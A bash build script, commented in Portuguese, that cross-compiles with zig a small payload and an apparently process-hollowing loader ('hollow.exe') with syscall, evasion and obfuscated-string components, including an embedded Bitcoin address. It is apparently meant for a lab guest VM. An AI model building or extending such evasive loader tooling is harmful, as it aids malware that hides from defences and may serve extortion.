#!/usr/bin/env bash
# build.sh — cross-compila os dois PE a partir do Linux, sem root.
# Toolchain: zig (traz mingw-w64 completo). Alternativa: x86_64-w64-mingw32-g++.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$ROOT/dist"
TARGET="x86_64-windows-gnu"

find_zig() {
  for c in "${ZIG:-}" "$HOME/.local/opt/zig/zig" "$(command -v zig 2>/dev/null || true)"; do
    [ -n "$c" ] && [ -x "$c" ] && { echo "$c"; return; }
  done
  return 1
}

ZIG="$(find_zig)" || {
  echo "zig nao encontrado. opcoes:"
  echo "  a) pacman -S mingw-w64-gcc   (troque o compilador abaixo)"
  echo "  b) baixe em https://ziglang.org/download/ e exporte ZIG=/caminho/zig"
  exit 1
}

mkdir -p "$OUT"
echo "[build] zig: $($ZIG version)"

LIBDIR="$(cd "$(dirname "$ZIG")" && pwd)/lib"
WININC="$LIBDIR/libc/include/any-windows-any"
[ -d "$WININC" ] || { echo "[!] headers mingw nao encontrados em $WININC"; exit 1; }

# 1. strings ofuscadas (BTC, caminho da calc, tag do marcador)
python3 "$ROOT/tools/gen_secret.py" --out "$ROOT/payload/strings.h" ${BTC:+--addr "$BTC"}

# 2. payload — sem CRT, entry point proprio. Fica em KB, cabe em hosts pequenos.
"$ZIG" c++ -target "$TARGET" -Os -nostdlib -fno-stack-protector -isystem "$WININC" \
  -Wl,--entry,payload_entry -Wl,--subsystem,console \
  -o "$OUT/payload.exe" "$ROOT/payload/payload.cpp" -lkernel32 -luser32

# 3. loader — CRT normal (usa std::string/vector), estatico, stripped.
"$ZIG" c++ -target "$TARGET" -O2 -s -static \
  -o "$OUT/hollow.exe" \
  "$ROOT/src/overwrite.cpp" "$ROOT/src/syscalls.cpp" \
  "$ROOT/src/pe.cpp" "$ROOT/src/defense.cpp" \
  -lshell32 -ladvapi32

echo
python3 "$ROOT/tools/peinfo.py" "$OUT/payload.exe" "$OUT/hollow.exe"
echo
echo "[build] ok — copie dist/ para o guest e rode:  hollow.exe --payload payload.exe"
